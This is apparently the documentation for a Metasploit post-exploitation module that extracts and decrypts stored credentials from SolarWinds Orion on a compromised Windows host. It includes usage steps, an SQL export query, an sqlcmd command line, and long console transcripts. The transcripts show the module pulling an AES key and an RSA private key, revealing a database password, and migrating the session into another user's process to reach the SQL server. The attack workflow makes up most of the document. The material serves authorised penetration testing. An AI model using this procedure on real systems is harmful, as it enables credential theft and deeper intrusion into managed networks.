## Vulnerable Application

This module exports and decrypts credentials from SolarWinds Orion Network Performance Monitor
to a CSV file; it is intended as a post-exploitation module for Windows hosts with SolarWinds
Orion NPM installed. The module supports decryption of AES-256, RSA, and XMLSEC secrets. Separate
actions for extraction and decryption of the data are provided to allow session migration during
execution in order to log in to the SQL database using SSPI. Tested on  the 2020 version of
SolarWinds Orion NPM. This module is possible only because of the source code and technical
information published by Rob Fuller:

https://malicious.link/post/2020/solarflare-release-password-dumper-for-SolarWinds-orion

and Atredis Partners:

https://github.com/atredispartners/solarwinds-orion-cryptography

Meterpreter must be running in the context of SYSTEM in order to extract encryption keys.

## Actions

### Dump

`dump` is the default action and performs extraction of the Orion database parameters and encryption keys.
This action also exports Orion SQL data and immediately decrypts it. `dump` is suitable when the following
conditions are met:

1. The sqlcmd binary is available on the target system
2. The machine account has access to the Orion database (if Windows Integrated) or Orion is using SQL native auth

Invoking the `dump` action requires SYSTEM level permissions on the target host in order to extract AES keys.

### Export

`export` performs SQL data extraction of the encrypted data as a CSV file; use this option if it is necessary to
migrate the Meterpreter session to a new non-SYSTEM identity in order to access the SQL database. Invoking the
`export` action requires the Meterpreter session to be running in the context of a user that has access to the
configured Orion SQL database.

### Decrypt

`decrypt` performs decryption of encrypted Orion SQL data. To invoke the `decrypt` action, you must also set the
`CSV_FILE` advanced option or the `MSSQL_INSTANCE` and `MSSQL_DB` options, as well as the `AES_KEY` and
`RSA_KEY_FILE` advanced options. See `SQL Data Acquisition` below for more information.

## Verification Steps

1. Start msfconsole
2. Get session on host via method of choice and background it
3. Do: `use post/windows/gather/credentials/solarwinds_orion_dump`
4. Do: `set session <session>`
5. Do: `dump` to extract and decrypt the Orion database, or `export` to extract the encrypted database only

If `dump` or `export` fail, the session identity may need permission to log in to SQL; see `Scenarios`.

## Advanced Options

### AES_KEY

The AES-256 key extracted from `default.dat` in hexadecimal format. Provide this option
when invoking offline decryption using the `decrypt` action.

### CERT_SHA1

The SHA1 thumbprint of the SSL certificate in the Windows machine certificate store that
is assigned to SolarWinds Orion for decryption of RSA and XMLSEC secrets. Set this option
if Orion uses a custom certificate or has multiple certificates in the store with a Subject
Common Name of `CN=solarwinds-orion`.

### CSV_FILE

Path to a CSV file that contains the encrypted Orion database data that has been
previously exported. Provide this option when invoking offline decryption using the
`decrypt` action.

### MSSQL_DB

The MSSQL database name used by Orion, specified in the `INITIAL CATALOG` as extracted
from `SWNetPerfMon.DB`. Provide this option when invoking the `export` action.

### MSSQL_INSTANCE

The path to the MSSQL instance used by Orion, specified in the `DATA SOURCE` as extracted
from `SWNetPerfMon.DB`. Provide this option when invoking the `export` action.

### RSA_KEY_FILE

Path to the extracted RSA private key associated with the certificate assigned to SolarWinds
Orion for decryption of RSA and XMLSEC secrets. Provide this option when invoking offline
decryption using the `decrypt` action, or you wish to provide alternative RSA private key
material during `dump`.

## Scenarios

### SQL Data Acquisition

The sqlcmd binaries (part of the SQL Server Management Studio) must be installed on the system
to access the database. Orion does not install SSMS or sqlcmd by default if it is not also
installing a local SQL server instance - in such cases, it will be necessary to extract the
encrypted database manually and provide the module with a path to the extracted data. To do so
execute the SQL query below against the Orion database and save the resulting row set as a CSV file.

The CSV header must match:

`CredentialID,Name,Description,CredentialType,CredentialOwner,CredentialPropertyName,Value,Encrypted`

Columns are cast `VARBINARY` to deal with poor CSV export support in `sqlcmd`. Export the results of
the query below to CSV file:

```
SELECT 
  c.ID AS CredentialID,
  CONVERT(VARBINARY(1024),c.Name) Name,
  CONVERT(VARBINARY(1024),c.Description) Description,
  CONVERT(VARBINARY(256),c.CredentialType) CredentialType,
  CONVERT(VARBINARY(256),c.CredentialOwner) CredentialOwner,
  CONVERT(VARBINARY(1024),cp.Name) CredentialPropertyName,
  CONVERT(VARBINARY(8000),cp.Value) Value,
  cp.Encrypted 
FROM
  [dbo].[Credential] AS c
JOIN 
  [dbo].[CredentialProperty] AS cp ON (c.ID=cp.CredentialID)
```

Output must be encoded VARBINARY per above, and must be well-formed CSV (i.e. no trailing whitespace).
If using `sqlcmd`, ensure the `-W` and `-I` parameters are included to strip trailing whitespace and
allow quoted identifyers. Suggested syntax for `sqlcmd` using Windows authentication is below, where
the contents of `solarwinds_sql_query.sql` is the text of the SQL query above:

`sqlcmd -d "<DBNAME>" -S <MSSQL_INSTANCE> -E -i solarwinds_sql_query.sql -o solarwinds_dump.csv -h-1 -s"," -w 65535 -W -I`

This should place a CSV export file suitable for use within the module at `solarwinds_dump.csv`. If
using SQL native auth, replace the `-E` parameter with

`-U "<MSSQL_USER>" -P "<MSSQL_PASS>"`

### Examples

Windows Server 2019 host running Orion NPM 2020 using the `dump` action:

```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/solarwinds_orion_dump
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set session 1
session => 1
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > dump

[*] Hostname WINNING IPv4 192.168.101.125
[*] SolarWinds Orion Build 2020.2.65120.0
[*] SolarWinds Orion Install Path: C:\Program Files (x86)\SolarWinds\Orion\
[*] Init SolarWinds Crypto ...
[*] Decrypt SolarWinds CryptoHelper Keystorage ...
[+] Compressed size: 2104
[+] Orion AES Encryption Key
[+]     HEX: 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
[*] Extract SolarWinds Orion SSL Certificate Private Key ...
[+] Compressed size: 1344
[+] Compressed size: 1736
[+] Extracted SolarWinds Orion RSA private key for LocalMachine certificate with SHA1 thumbprint C3D5248B978C8D161DA0267C1DE946B1FDE4E7D2
[+] SolarWinds Orion RSA Key: /root/.msf4/loot/20221118093908_default_192.168.101.125_orionssl_000289.key
[*] Decrypt SWNetPerfMon.DB ...
[+] Compressed size: 2064
[+] SolarWinds Orion SQL Database Connection Configuration:
[+]     Instance Name: tcp:cornflakes.cesium137.io
[+]     Database Name: SolarWindsOrion
[+]     Database User: orion
[+]     Database Pass: 3qmEixYNZsElaE0JR0vt9c1NwO
[*] Performing export of SolarWinds Orion SQL database to CSV file
[*] Export SolarWinds Orion DB ...
[+] 10 rows exported, 6 unique CredentialIDs
[+] Encrypted SolarWinds Orion Database Dump: /root/.msf4/loot/20221118093912_default_192.168.101.125_solarwinds_orion_822163.txt
[*] Performing decryption of SolarWinds Orion SQL database
[+] 10 rows loaded, 6 unique CredentialIDs
[*] Process SolarWinds Orion DB ...
[+] 10 rows processed
[*] 10 rows recovered: 6 plaintext, 4 decrypted (0 blank)
[*] 10 rows written (0 blank rows withheld)
[+] 6 unique CredentialID records recovered
[+] Decrypted SolarWinds Orion Database Dump: /root/.msf4/loot/20221118093912_default_192.168.101.125_solarwinds_orion_067745.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/solarwinds_orion_dump) >
```

Host with MSSQL SSPI authentication configured for external database - use `dump` to
extract keys, then migrate the session PID to an identity with permission to log on to
the SQL server. Perform `export` to acquire the encrypted data, then perform `decrypt`
to produce the plaintext:

```
msf6 exploit(multi/handler) > use post/windows/gather/credentials/solarwinds_orion_dump
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set session 1
session => 1
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > dump

[*] Hostname WINNING IPv4 192.168.101.125
[*] SolarWinds Orion Build 2020.2.65120.0
[*] SolarWinds Orion Install Path: C:\Program Files (x86)\SolarWinds\Orion\
[*] Init SolarWinds Crypto ...
[*] Decrypt SolarWinds CryptoHelper Keystorage ...
[+] Compressed size: 2108
[+] Orion AES Encryption Key
[+]     HEX: 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
[*] Extract SolarWinds Orion SSL Certificate Private Key ...
[+] Compressed size: 1344
[+] Compressed size: 1748
[+] Extracted SolarWinds Orion RSA private key for LocalMachine certificate with SHA1 thumbprint C3D5248B978C8D161DA0267C1DE946B1FDE4E7D2
[+] SolarWinds Orion RSA Key: /root/.msf4/loot/20221118091221_default_192.168.101.125_orionssl_457287.key
[*] Decrypt SWNetPerfMon.DB ...
[+] SolarWinds Orion SQL Database Connection Configuration:
[+]     Instance Name: tcp:cornflakes.cesium137.io
[+]     Database Name: SolarWindsOrion
[+]     Database User: (Windows Integrated)
[!] The database uses Windows authentication
[!] Session identity must have access to the SQL server instance to proceed
[*] Performing export of SolarWinds Orion SQL database to CSV file
[*] Export SolarWinds Orion DB ...
[-] Sqlcmd: Error: Microsoft ODBC Driver 13 for SQL Server : Login failed for user 'CESIUM137\WINNING$'..
[-] No records exported from SQL server
[-] Post aborted due to failure: unknown: Could not export SolarWinds Orion database records
[*] Post module execution completed
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set AES_KEY 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
AES_KEY => 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set RSA_KEY_FILE /root/.msf4/loot/20221118091221_default_192.168.101.125_orionssl_457287.key
RSA_KEY_FILE => /root/.msf4/loot/20221118091221_default_192.168.101.125_orionssl_457287.key
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set MSSQL_INSTANCE tcp:cornflakes.cesium137.io
MSSQL_INSTANCE => tcp:cornflakes.cesium137.io
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set MSSQL_DB SolarWindsOrion
MSSQL_DB => SolarWindsOrion
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > ps

Process List
============

 PID    PPID   Name                                     Arch  Session  User                                Path
 ---    ----   ----                                     ----  -------  ----                                ----
 0      0      [System Process]
 4      0      System                                   x64   0
 [...]
 10704  10636  explorer.exe                             x64   1        CESIUM137\operatorman               C:\Windows\explorer.exe
 [...]

meterpreter > migrate 10704
[*] Migrating from 17108 to 10704...
[*] Migration completed successfully.
meterpreter > bg
[*] Backgrounding session 1...
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > export

[*] Hostname WINNING IPv4 192.168.101.125
[*] SolarWinds Orion Build 2020.2.65120.0
[*] SolarWinds Orion Install Path: C:\Program Files (x86)\SolarWinds\Orion\
[*] Init SolarWinds Crypto ...
[+] Orion AES Encryption Key
[+]     HEX: 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
[*] Extract SolarWinds Orion SSL Certificate Private Key ...
[*] MSSQL_INSTANCE and MSSQL_DB advanced options set, connect to SQL using SSPI
[+] SolarWinds Orion SQL Database Connection Configuration:
[+]     Instance Name: tcp:cornflakes.cesium137.io
[+]     Database Name: SolarWindsOrion
[+]     Database User: (Windows Integrated)
[!] The database uses Windows authentication
[!] Session identity must have access to the SQL server instance to proceed
[*] Performing export of SolarWinds Orion SQL database to CSV file
[*] Export SolarWinds Orion DB ...
[+] 10 rows exported, 6 unique CredentialIDs
[+] Encrypted SolarWinds Orion Database Dump: /root/.msf4/loot/20221118091938_default_192.168.101.125_solarwinds_orion_412973.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > set CSV_FILE /root/.msf4/loot/20221118091938_default_192.168.101.125_solarwinds_orion_412973.txt
CSV_FILE => /root/.msf4/loot/20221118091938_default_192.168.101.125_solarwinds_orion_412973.txt
msf6 post(windows/gather/credentials/solarwinds_orion_dump) > decrypt 

[*] Hostname WINNING IPv4 192.168.101.125
[*] SolarWinds Orion Build 2020.2.65120.0
[*] SolarWinds Orion Install Path: C:\Program Files (x86)\SolarWinds\Orion\
[*] Init SolarWinds Crypto ...
[+] Orion AES Encryption Key
[+]     HEX: 2F627B78981DEADE0447CC7BDDEADE4E84FCB96AF1C6DEAD621F28547E93A82
[*] Extract SolarWinds Orion SSL Certificate Private Key ...
[*] Performing decryption of SolarWinds Orion SQL database
[+] 10 rows loaded, 6 unique CredentialIDs
[*] Process SolarWinds Orion DB ...
[+] 10 rows processed
[*] 10 rows recovered: 6 plaintext, 4 decrypted (0 blank)
[*] 10 rows written (0 blank rows withheld)
[+] 6 unique CredentialID records recovered
[+] Decrypted SolarWinds Orion Database Dump: /root/.msf4/loot/20221118091959_default_192.168.101.125_solarwinds_orion_687493.txt
[*] Post module execution completed
msf6 post(windows/gather/credentials/solarwinds_orion_dump) >
```
